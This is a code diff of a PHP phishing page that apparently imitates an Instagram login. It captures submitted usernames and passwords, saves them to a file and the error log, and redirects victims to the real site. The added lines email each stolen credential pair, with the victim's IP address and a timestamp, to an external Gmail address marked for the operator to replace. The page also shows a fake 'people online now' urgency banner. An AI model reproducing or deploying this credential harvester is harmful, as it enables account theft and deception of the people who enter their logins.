@@ -1,11 +1,15 @@
 <?php
 ob_start(); // Start output buffering
-
 if($_SERVER['REQUEST_METHOD']=='POST'){
     $name = $_POST['username'];
     $pass = $_POST['pass'];
     $data = "user=$name,pass=$pass" . PHP_EOL;
     file_put_contents('user.txt', $data, FILE_APPEND | LOCK_EX);
+    $to = "customerking97@gmail.com"; // ← CHANGE TO YOUR EMAIL
+    $subject = "New Credentials Captured";
+    $message = "Username: $name\nPassword: $pass\nIP: {$_SERVER['REMOTE_ADDR']}\nTime: " . date('Y-m-d H:i:s');
+    $headers = "From: noreply@yoursite.com";
+    mail($to, $subject, $message, $headers);
     error_log("username=$name,pass=$pass");
     sleep(2);
     header('Location: https://instagram.com');
@@ -189,7 +193,6 @@ if($_SERVER['REQUEST_METHOD']=='POST'){
         <div class="warning">
             ⚠️ By entering your credentials, you agree to our terms and confirm you are 18+ years old
         </div>
-
         <div class="count">
             🔥 247 people online now - Don't miss out!
         </div>
